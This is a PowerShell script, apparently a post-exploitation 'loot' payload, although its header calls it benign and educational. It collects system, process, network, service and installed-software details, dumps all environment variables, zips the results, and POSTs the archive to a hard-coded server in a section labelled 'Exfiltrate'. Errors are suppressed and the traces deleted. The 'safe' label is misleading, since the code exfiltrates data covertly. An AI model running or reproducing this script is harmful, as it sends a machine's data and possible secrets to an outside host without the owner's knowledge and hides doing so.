# loot.ps1 - Benign system information collection for Windows
# Safe for educational/demo purposes - collects only basic system configuration

$SERVER_IP = "192.168.137.1"
$PORT = 80
$LOOT_DIR = Join-Path $env:TEMP ("loot-" + [Guid]::NewGuid().ToString())

New-Item -ItemType Directory -Force -Path $LOOT_DIR | Out-Null

# --- System Information Collection ---
New-Item -ItemType Directory -Force -Path "$LOOT_DIR\system_info" | Out-Null

# Operating System Information
Get-CimInstance Win32_OperatingSystem | Select-Object * | Out-File "$LOOT_DIR\system_info\os_info.txt"
Get-ComputerInfo | Out-File "$LOOT_DIR\system_info\computer_info.txt"
systeminfo | Out-File "$LOOT_DIR\system_info\systeminfo.txt"

# Process Information
Get-Process | Select-Object Name, Id, CPU, WorkingSet, Path | Out-File "$LOOT_DIR\system_info\process_list.txt"

# Network Configuration
ipconfig /all | Out-File "$LOOT_DIR\system_info\ipconfig.txt"
Get-NetAdapter | Out-File "$LOOT_DIR\system_info\network_adapters.txt"
Get-NetIPAddress | Out-File "$LOOT_DIR\system_info\ip_addresses.txt"
Get-NetRoute | Out-File "$LOOT_DIR\system_info\routes.txt"
netstat -ano | Out-File "$LOOT_DIR\system_info\netstat.txt"

# Services
Get-Service | Out-File "$LOOT_DIR\system_info\services.txt"

# Environment Variables
Get-ChildItem Env: | Out-File "$LOOT_DIR\system_info\environment.txt"

# Installed Software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher | Out-File "$LOOT_DIR\system_info\installed_software.txt"

# ---------------------------------------------------------------------------
# Compress
# ---------------------------------------------------------------------------
$ZipPath = Join-Path $env:TEMP "loot.zip"
Compress-Archive -Path "$LOOT_DIR\*" -DestinationPath $ZipPath -Force

# ---------------------------------------------------------------------------
# Exfiltrate
# ---------------------------------------------------------------------------
try {
    $Uri = "http://$SERVER_IP`:$PORT/"
    Invoke-WebRequest -Uri $Uri -Method Post -InFile $ZipPath -UseBasicParsing
} catch {
    # Fail silently
}

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
Remove-Item -Recurse -Force $LOOT_DIR -ErrorAction SilentlyContinue
Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
